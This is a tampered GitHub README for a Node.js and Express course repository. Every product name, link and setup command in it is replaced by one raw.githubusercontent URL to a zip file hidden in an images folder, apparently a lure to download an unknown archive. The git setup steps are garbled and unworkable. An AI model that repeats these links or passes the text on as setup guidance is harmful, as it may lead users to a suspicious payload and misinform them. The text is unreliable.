# Building a website with https://raw.githubusercontent.com/Waka758/building-website-nodejs-express/master/provided/static/images/misc/express_building_website_nodejs_unstrap.zip and Express

This repository contains the code for my course 'Building a Website with https://raw.githubusercontent.com/Waka758/building-website-nodejs-express/master/provided/static/images/misc/express_building_website_nodejs_unstrap.zip https://raw.githubusercontent.com/Waka758/building-website-nodejs-express/master/provided/static/images/misc/express_building_website_nodejs_unstrap.zip' on [LinkedIn Learning](https://raw.githubusercontent.com/Waka758/building-website-nodejs-express/master/provided/static/images/misc/express_building_website_nodejs_unstrap.zip).

The master branch contains the initial version to get started with, while the branches contain the state of the code at the beginning (e.g. 02_02**b**) and end (e.g. 02_02**e**) of a video.

## Setting up the project

* In your terminal, create directory `building-website-nodejs-express` and **change into it**.
* Run 
  ```bash
  git clone --bare https://raw.githubusercontent.com/Waka758/building-website-nodejs-express/master/provided/static/images/misc/express_building_website_nodejs_unstrap.zip .git
  git config --bool https://raw.githubusercontent.com/Waka758/building-website-nodejs-express/master/provided/static/images/misc/express_building_website_nodejs_unstrap.zip false
  git reset --hard
  git branch
  ```
  
Everything else will be discussed in my course.
